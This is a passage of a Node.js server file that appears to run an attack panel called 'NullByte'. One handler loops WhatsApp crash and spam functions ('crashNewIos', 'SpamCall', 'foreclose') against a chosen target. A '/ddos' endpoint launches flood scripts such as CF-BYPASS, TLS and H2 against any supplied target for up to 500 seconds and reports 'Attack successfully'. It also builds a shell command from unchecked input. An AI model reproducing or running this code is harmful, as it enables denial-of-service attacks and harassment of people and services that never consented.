          await Lostsaga2(isTarget);
          await JtwInvis(dim, target);
          await StickerPc(dim, target);
        }
        break;

      case "foreclose":
        for (let i = 0; i < 40; i++) {
          await FcBeta(dim, isTarget);
          await CallUi(dim, isTarget);
          await fccil(dim, isTarget);
        }
        break;

      case "blank":
        for (let i = 0; i < 40; i++) {
          await blankP(dim, isTarget);
        }
        break;

      case "ios":
        for (let i = 0; i < 40; i++) {
          await iosInVis(dim, isTarget);
          await crashNewIos(dim, isTarget);
          await fccil(dim, isTarget);
        }
        break;

      case "delay":
        for (let i = 0; i < 300; i++) {
          await NativeSql3(dim, target);
          await DelayNewBetaV3(dim, target);
          await betadelayNew(dim, target);
        }
        break;

      case "call":
        for (let i = 0; i < 40; i++) {
          await SpamCall(dim, isTarget);
        }
        break;

      case "combo":
        for (let i = 0; i < 40; i++) {
          await FcBeta(dim, isTarget);
          await CallUi(dim, isTarget);
          await fccil(dim, isTarget);
          await iosInVis(dim, isTarget);
          await crashNewIos(dim, isTarget);
        }
        break;

      default:
        return res.status(400).json({ status: false, message: "Metode tidak dikenali" });
    }

    return res.json({ status: 200, target: target, metode: metode.toLowerCase(), result: "sukses" });

  } catch (err) {
    console.error("Gagal kirim:", err);
    return res.status(500).json({ status: false, message: "Feature Under Construction" });
  }
});

app.post("/ddos", requireAuth, async (req, res) => {
  try {
    const { key, metode, target, time } = req.body;

    if (!key || !metode || !target || !time) {
      return res.status(400).json({
        status: false,
        message: "Required parameters: key, metode, target, time"
      });
    }

    if (key !== "NullByte") {
      return res.status(403).json({
        status: false,
        message: "Incorrect API key"
      });
    }

    const duration = parseInt(time);
    if (isNaN(duration) || duration < 1 || duration > 500) {
      return res.status(400).json({
        status: false,
        message: "Time must be 1 - 500 seconds"
      });
    }

    const validMethods = [
      "BYPASS", "CIBI", "FLOOD", "GLORY",
      "HTTPS", "HTTPX", "HTTP-X", "RAW",
      "TLS", "UAM", "CF", "H2", "CF-BYPASS"
    ];

    if (!validMethods.includes(metode)) {
      return res.status(400).json({
        status: false,
        message: "Method not supported"
      });
    }

    const command = `node ${metode}.js ${target} ${duration}`;
    exec(command, {
      cwd: path.join(__dirname, "methods"),
      timeout: (duration + 10) * 1000
    }, (error, stdout, stderr) => {
      if (error) console.error(`Command error: ${error.message}`);
      if (stderr) console.warn(`Command stderr: ${stderr}`);
      if (stdout) console.log(`Command output: ${stdout}`);
    });

    return res.json({
      status: true,
      Target: target,
      Methods: metode,
      Time: duration,
      Message: "Attack successfully"
    });

  } catch (err) {
    console.error("DDoS endpoint error:", err);
    return res.status(500).json({
      status: false,
      message: "Internal server error"
    });
  }
});

app.use((req, res, next) => {
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    success: false,
    message: 'Internal Server Error'
  });
});

initializeWhatsAppConnections();
bot.launch();

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server is running on port ${PORT}`);
  console.log(` Access dashboard: https://nullbyte.space/dashboard`);
  console.log(` Access DDOS panel: https://nullbyte.space/ddos-dashboard`);
  console.log(` Public URL: https://nullbyte.space/`);
});

